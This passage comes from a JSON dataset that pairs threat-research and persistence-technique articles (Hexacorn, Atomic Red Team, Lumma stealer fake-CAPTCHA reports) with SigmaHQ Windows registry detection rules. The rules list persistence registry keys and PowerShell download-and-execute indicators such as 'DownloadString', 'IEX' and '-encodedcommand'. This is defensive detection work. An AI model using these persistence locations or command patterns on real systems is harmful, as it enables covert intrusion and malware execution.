      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_event_viewer_events_asp.yml"
  },
  "1001": {
    "url": "https://www.hexacorn.com/blog/2017/01/18/beyond-good-ol-run-key-part-55/",
    "markdown": "# Beyond good ol’ Run key, Part 55 Posted on 2017-01-18 The flexibility offered by the Registry comes with a price. Whoever is in a position to change the Registry keys or its values can affect not only the way OS works, but also adjust the functionality of many programs relying on some particular settings. If we talk about persistence, there is yet another location that may be abused for this purpose. The trick I am going to describe is actually very old, but with the intention to document as many persistence mechanisms as possible nothing should be omitted. Plus,",
    "sigma_rule": {
      "title": "Potential Persistence Via MyComputer Registry Keys",
      "id": "8fbe98a8-8f9d-44f8-aa71-8c572e29ef06",
      "status": "test",
      "description": "Detects modification to the \"Default\" value of the \"MyComputer\" key and subkeys to point to a custom binary that will be launched whenever the associated action is executed (see reference section for example)",
      "references": [
        "https://www.hexacorn.com/blog/2017/01/18/beyond-good-ol-run-key-part-55/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-09",
      "modified": "2024-01-11",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer",
          "TargetObject|endswith": "(Default)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely but if you experience FPs add specific processes and locations you would like to monitor for"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_mycomputer.yml"
  },
  "1002": {
    "url": "https://persistence-info.github.io/Data/naturallanguage6.html",
    "markdown": "# persistence-info.github.io ## Natural Language 6 DLLs ### Location: ``` HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language ``` ### Classification: | Criteria | Value | |------------------|----------------------| | Permissions | Admin | | Security context | System | | Persistence type | Registry | | Code type | DLL | | Launch type | Automatic | | Impact | Non-destructive [^1] | | OS Version | All OS versions [^2] | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > C:\\WINDOWS\\system32\\SearchIndexer.exe process looks for the `DLLOverridePath` entries under the following locations (language may vary on non-English OS versions): > `HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\English_UK` > `HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\English_US`",
    "sigma_rule": {
      "title": "Potential Persistence Via DLLPathOverride",
      "id": "a1b1fd53-9c4a-444c-bae0-34a330fc7aa8",
      "status": "test",
      "description": "Detects when an attacker adds a new \"DLLPathOverride\" value to the \"Natural Language\" key in order to achieve persistence which will get invoked by \"SearchIndexer.exe\" process",
      "references": [
        "https://persistence-info.github.io/Data/naturallanguage6.html",
        "https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "TargetObject|contains": "\\SYSTEM\\CurrentControlSet\\Control\\ContentIndex\\Language\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\StemmerDLLPathOverride",
            "\\WBDLLPathOverride",
            "\\StemmerClass",
            "\\WBreakerClass"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_natural_language.yml"
  },
  "1003": {
    "url": "https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/",
    "markdown": "# Beyond good ol’ Run key, Part 98 Posted on 2018-12-30 by adam Scanning the Windows files for possible persistence mechanisms I came across a few interesting strings inside the Natural Language Development Platform 6 library (NaturalLanguage6.dll): - StemmerDLLPathOverride - WBDLLPathOverride - StemmerClass - WBreakerClass Quick google exercise followed and I found this post in Russian that explains that these are actual Registry entries – by changing them the author was able to use Russian morphology modules for searches on Sharepoint. Cool. Now that I had an idea what it is, I was curious if the entries are used on",
    "sigma_rule": {
      "title": "Potential Persistence Via DLLPathOverride",
      "id": "a1b1fd53-9c4a-444c-bae0-34a330fc7aa8",
      "status": "test",
      "description": "Detects when an attacker adds a new \"DLLPathOverride\" value to the \"Natural Language\" key in order to achieve persistence which will get invoked by \"SearchIndexer.exe\" process",
      "references": [
        "https://persistence-info.github.io/Data/naturallanguage6.html",
        "https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "TargetObject|contains": "\\SYSTEM\\CurrentControlSet\\Control\\ContentIndex\\Language\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\StemmerDLLPathOverride",
            "\\WBDLLPathOverride",
            "\\StemmerClass",
            "\\WBreakerClass"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_natural_language.yml"
  },
  "1004": {
    "url": "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
    "markdown": "# Malware development: persistence - part 18. Windows Error Reporting. Simple C++ example. --- ```image Alt: pers Description: The image displays a C++ code snippet for malware persistence via 'WerFault.exe', alongside a Windows PowerShell window showing commands related to registry manipulation. The code includes functions for opening registry keys, setting values, and managing a hijacked application. The PowerShell window shows a query for registry keys linked to Windows Error Reporting, with a dialogue box appearing that responds to the command with 'Meow-meow!'. This technical representation provides insights into malware development techniques. Transcription: | cpp // pers.cpp // windows persistence via",
    "sigma_rule": {
      "title": "Potential WerFault ReflectDebugger Registry Value Abuse",
      "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
      "related": [
        {
          "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potential WerFault \"ReflectDebugger\" registry value abuse for persistence.",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|endswith": "\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_reflectdebugger.yml"
  },
  "1005": {
    "url": "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/",
    "markdown": "# Beyond good ol’ Run key, Part 85 Posted on 2018-08-31 This is a LOLbinish 2-stage persistence trick. One where we add startup items to point to OS binaries, and – while they will be ignored by many users and security solutions (at least at first glance) – they will be launching the second stage of the persistence mechanism for us… Many people who use win7-win10 know that the Werfault.exe process is all over the place. It’s a process ‘repairer’ or ‘fixer’ that handles crashes or other unpleasant activities of other processes. It turns out you can launch werfault.exe with",
    "sigma_rule": {
      "title": "Potential WerFault ReflectDebugger Registry Value Abuse",
      "id": "0cf2e1c6-8d10-4273-8059-738778f981ad",
      "related": [
        {
          "id": "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potential WerFault \"ReflectDebugger\" registry value abuse for persistence.",
      "references": [
        "https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html",
        "https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/"
      ],
      "author": "X__Junior",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "SetValue",
          "TargetObject|endswith": "\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_reflectdebugger.yml"
  },
  "1006": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
    "markdown": "# T1137.006 - Office Application Startup: Add-ins ## Description from ATT&CK Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018) Add-ins can be used to obtain persistence because they",
    "sigma_rule": {
      "title": "Potential Persistence Via Excel Add-in - Registry",
      "id": "961e33d1-4f86-4fcf-80ab-930a708b2f82",
      "status": "test",
      "description": "Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence"
      ],
      "author": "frack113",
      "date": "2023-01-15",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "Software\\Microsoft\\Office\\",
          "TargetObject|endswith": "\\Excel\\Options",
          "Details|startswith": "/R ",
          "Details|endswith": ".xll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_xll.yml"
  },
  "1007": {
    "url": "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
    "markdown": "# Add-In Opportunities for Office Persistence 21 April, 2017 ## Introduction One software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office. Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms. This post will explore various opportunities for gaining persistence through native Microsoft Office functionality. It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“One Template to Rule ‘Em All”). The following opportunities for Office-based persistence will",
    "sigma_rule": {
      "title": "Potential Persistence Via Excel Add-in - Registry",
      "id": "961e33d1-4f86-4fcf-80ab-930a708b2f82",
      "status": "test",
      "description": "Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence"
      ],
      "author": "frack113",
      "date": "2023-01-15",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "Software\\Microsoft\\Office\\",
          "TargetObject|endswith": "\\Excel\\Options",
          "Details|startswith": "/R ",
          "Details|endswith": ".xll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_xll.yml"
  },
  "1008": {
    "url": "https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry",
    "markdown": "# T1547.001 - Registry Run Keys / Startup Folder ## Description from ATT&CK Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. Placing a program within a startup folder will also cause that program to execute when a user logs",
    "sigma_rule": {
      "title": "Suspicious Powershell In Registry Run Keys",
      "id": "8d85cf08-bf97-4260-ba49-986a2a65129c",
      "status": "test",
      "description": "Detects potential PowerShell commands or code within registry run keys",
      "references": [
        "https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "frack113, Florian Roth (Nextron Systems)",
      "date": "2022-03-17",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "Details|contains": [
            "powershell",
            "pwsh ",
            "FromBase64String",
            ".DownloadFile(",
            ".DownloadString(",
            " -w hidden ",
            " -w 1 ",
            "-windowstyle hidden",
            "-window hidden",
            " -nop ",
            " -encodedcommand ",
            "-ExecutionPolicy Bypass",
            "Invoke-Expression",
            "IEX (",
            "Invoke-Command",
            "ICM -",
            "Invoke-WebRequest",
            "IWR ",
            " -noni ",
            " -noninteractive "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin or third party scripts. Baseline according to your environment"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_powershell_in_run_keys.yml"
  },
  "1009": {
    "url": "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html",
    "markdown": "# LV Ransomware Exploits ProxyShell in Attack on a Jordan-based Company Our blog entry provides a look at an attack involving the LV ransomware on a Jordan-based company from an intrusion analysis standpoint. **Date:** October 25, 2022 ## Overview The Trend Micro research team recently analyzed an infection related to the LV ransomware group, a ransomware as a service (RaaS) operation that has been active since late 2020, and is reportedly based on REvil (aka Sodinokibi). The exact nature of the relationship between the LV ransomware and REvil groups cannot be definitively established or verified — the LV ransomware’s developers",
    "sigma_rule": {
      "title": "Suspicious Powershell In Registry Run Keys",
      "id": "8d85cf08-bf97-4260-ba49-986a2a65129c",
      "status": "test",
      "description": "Detects potential PowerShell commands or code within registry run keys",
      "references": [
        "https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "frack113, Florian Roth (Nextron Systems)",
      "date": "2022-03-17",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "Details|contains": [
            "powershell",
            "pwsh ",
            "FromBase64String",
            ".DownloadFile(",
            ".DownloadString(",
            " -w hidden ",
            " -w 1 ",
            "-windowstyle hidden",
            "-window hidden",
            " -nop ",
            " -encodedcommand ",
            "-ExecutionPolicy Bypass",
            "Invoke-Expression",
            "IEX (",
            "Invoke-Command",
            "ICM -",
            "Invoke-WebRequest",
            "IWR ",
            " -noni ",
            " -noninteractive "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin or third party scripts. Baseline according to your environment"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_powershell_in_run_keys.yml"
  },
  "1010": {
    "url": "https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf",
    "markdown": "# Fake CAPTCHA Campaign on Arabic Pirated Movie Sites Delivers Lumma Stealer I began investigating an incident where **multiple users** in **various environments** executed the **same PowerShell command** via the **Run dialog**. Upon further analysis, I discovered a **fake CAPTCHA campaign** targeting visitors of **Arabic pirated movie websites**, including but not limited to: 1. **Egybest** 2. **Halacima** 3. **Shahedpro** 4. **Mycima** The threat actor appears to have **purchased ads** on these and other similar websites, redirecting users to a **fake CAPTCHA page** designed to initiate a malicious infection chain and deliver Lumma stealer. ```image Alt: Fake CAPTCHA Campaign Description: The",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Executed Via Run Dialog Box - Registry",
      "id": "a7df0e9e-91a5-459a-a003-4cde67c2ff5d",
      "related": [
        {
          "id": "f9d091f6-f1c7-4873-a24f-050b4a02b4dd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n",
      "references": [
        "https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf",
        "https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71",
        "https://www.forensafe.com/blogs/runmrukey.html",
        "https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/"
      ],
      "author": "Ahmed Farouk, Nasreddine Bencherchali",
      "date": "2024-11-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
        },
        "selection_powershell_command": {
          "Details|contains": [
            "powershell",
            "pwsh"
          ]
        },
        "selection_powershell_susp_keywords": {
          "Details|contains": [
            " -e ",
            " -ec ",
            " -en ",
            " -enc ",
            " -enco",
            "ftp",
            "Hidden",
            "http",
            "iex",
            "Invoke-"
          ]
        },
        "selection_wmic_command": {
          "Details|contains": "wmic"
        },
        "selection_wmic_susp_keywords": {
          "Details|contains": [
            "shadowcopy",
            "process call create"
          ]
        },
        "condition": "selection_key and (all of selection_powershell_* or all of selection_wmic_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_runmru_susp_command_execution.yml"
  },
  "1011": {
    "url": "https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71",
    "markdown": "# Downloading Trojan(Lumma Infostealer) Through Captcha Following the Phishing campaign that targets users with fake Captcha and masquerades them to download Trojan malware(Lumma), I have gotten a new phishing newly created domain that contains 2 phishing html captcha. ```image Alt: Phishing Captcha Description: The image displays a directory listing of a web server. It includes several files and folders with details such as their names, last modified dates, sizes, and descriptions. The files listed are 'codech.php', 'veri.html', 'verify-captcha-v2.html', and 'w.php', along with a directory named 'cgi-bin/'. The structure suggests this may be part of a phishing campaign related to the",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Executed Via Run Dialog Box - Registry",
      "id": "a7df0e9e-91a5-459a-a003-4cde67c2ff5d",
      "related": [
        {
          "id": "f9d091f6-f1c7-4873-a24f-050b4a02b4dd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n",
      "references": [
        "https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf",
        "https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71",
        "https://www.forensafe.com/blogs/runmrukey.html",
        "https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/"
      ],
      "author": "Ahmed Farouk, Nasreddine Bencherchali",
      "date": "2024-11-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
        },
        "selection_powershell_command": {
          "Details|contains": [
            "powershell",
            "pwsh"
          ]
        },
        "selection_powershell_susp_keywords": {
          "Details|contains": [
            " -e ",
            " -ec ",
            " -en ",
            " -enc ",
            " -enco",
            "ftp",
            "Hidden",
            "http",
            "iex",
            "Invoke-"
          ]
        },
        "selection_wmic_command": {
          "Details|contains": "wmic"
        },
        "selection_wmic_susp_keywords": {
          "Details|contains": [
            "shadowcopy",
            "process call create"
          ]
        },
        "condition": "selection_key and (all of selection_powershell_* or all of selection_wmic_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_runmru_susp_command_execution.yml"
  },
  "1012": {
    "url": "https://www.forensafe.com/blogs/runmrukey.html",
    "markdown": "# Blog >> Run MRU ### Investigating Run MRU *29/04/2022* The Run utility on Windows Systems enables the user to directly open an application, folder or document. In Windows 10, the Run utility can be accessed by right-clicking on Start > Run or by using the keyboard shortcut Windows Key + R. As seen in the figure below, the Run utility includes a drop-down list that shows the last commands executed via the Run dialog. ```image Alt: Run Utility Description: The image depicts the Windows Run dialog box that allows users to execute programs, folders, documents, or internet resources by",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Executed Via Run Dialog Box - Registry",
      "id": "a7df0e9e-91a5-459a-a003-4cde67c2ff5d",
      "related": [
        {
          "id": "f9d091f6-f1c7-4873-a24f-050b4a02b4dd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n",
      "references": [
        "https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf",
        "https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71",
        "https://www.forensafe.com/blogs/runmrukey.html",
        "https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/"
      ],
      "author": "Ahmed Farouk, Nasreddine Bencherchali",
      "date": "2024-11-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
        },
        "selection_powershell_command": {
          "Details|contains": [
            "powershell",
            "pwsh"
          ]
        },
        "selection_powershell_susp_keywords": {
          "Details|contains": [
            " -e ",
            " -ec ",
            " -en ",
            " -enc ",
            " -enco",
            "ftp",
            "Hidden",
            "http",
            "iex",
            "Invoke-"
          ]
        },
        "selection_wmic_command": {
          "Details|contains": "wmic"
        },
        "selection_wmic_susp_keywords": {
          "Details|contains": [
            "shadowcopy",
            "process call create"
          ]
        },
        "condition": "selection_key and (all of selection_powershell_* or all of selection_wmic_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_runmru_susp_command_execution.yml"
  },
  "1013": {
    "url": "https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/",
    "markdown": "## Intelligence Insights: October 2024 LummaC2 lurks thanks to PowerShell pasting in this month’s edition of Intelligence Insights. **Originally published:** October 24, 2024. **Last modified:** October 25, 2024. --- ### Highlights from September ChromeLoader and SocGholish maintained their 1st and 2nd place spots respectively among this month’s top 10 most prevalent threats. Several familiar faces returned to the list, including Amber Albatross in 3rd and Scarlet Goldfinch in 4th. Adload and Raspberry Robin returned as well, in a tie for 10th along with Charcoal Stork. We continued to see increased LummaC2 activity, even as it dropped in our overall rankings",
    "sigma_rule": {
      "title": "Potentially Suspicious Command Executed Via Run Dialog Box - Registry",
      "id": "a7df0e9e-91a5-459a-a003-4cde67c2ff5d",
      "related": [
        {
          "id": "f9d091f6-f1c7-4873-a24f-050b4a02b4dd",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of commands via the run dialog box on Windows by checking values of the \"RunMRU\" registry key.\nThis technique was seen being abused by threat actors to deceive users into pasting and executing malicious commands, often disguised as CAPTCHA verification steps.\n",
      "references": [
        "https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf",
        "https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71",
        "https://www.forensafe.com/blogs/runmrukey.html",
        "https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/"
      ],
      "author": "Ahmed Farouk, Nasreddine Bencherchali",
      "date": "2024-11-01",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
        },
        "selection_powershell_command": {
          "Details|contains": [
            "powershell",
            "pwsh"
          ]
        },
        "selection_powershell_susp_keywords": {
          "Details|contains": [
            " -e ",
            " -ec ",
            " -en ",
            " -enc ",
            " -enco",
            "ftp",
            "Hidden",
            "http",
            "iex",
            "Invoke-"
          ]
        },
        "selection_wmic_command": {
          "Details|contains": "wmic"
        },
        "selection_wmic_susp_keywords": {
          "Details|contains": [
            "shadowcopy",
            "process call create"
          ]
        },
        "condition": "selection_key and (all of selection_powershell_* or all of selection_wmic_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_runmru_susp_command_execution.yml"
  },
  "1014": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time",
    "markdown": "# T1543.003 - Windows Service ## Description from ATT&CK Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. (Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as `sc.exe`),",
    "sigma_rule": {
      "title": "ServiceDll Hijack",
      "id": "612e47e9-8a59-43a6-b404-f48683f45bd6",
      "status": "test",
      "description": "Detects changes to the \"ServiceDLL\" value related to a service in the registry.\nThis is often used as a method of persistence.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time",
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/"
      ],
      "author": "frack113",
      "date": "2022-02-04",
      "modified": "2024-04-03",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\System\\",
            "ControlSet",
            "\\Services\\"
          ],
          "TargetObject|endswith": "\\Parameters\\ServiceDll"
        },
        "filter_main_printextensionmanger": {
          "Details": "C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll"
        },
        "filter_main_domain_controller": {
          "Image": "C:\\Windows\\system32\\lsass.exe",
          "TargetObject|endswith": "\\Services\\NTDS\\Parameters\\ServiceDll",
          "Details": "%%systemroot%%\\system32\\ntdsa.dll"
        },
        "filter_main_poqexec": {
          "Image": "C:\\Windows\\System32\\poqexec.exe"
        },
        "filter_optional_safetica": {
          "Image|endswith": "\\regsvr32.exe",
          "Details": "C:\\Windows\\System32\\STAgent.dll"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Administrative scripts",
        "Installation of a service"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_servicedll_hijack.yml"
  },
  "1015": {
    "url": "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
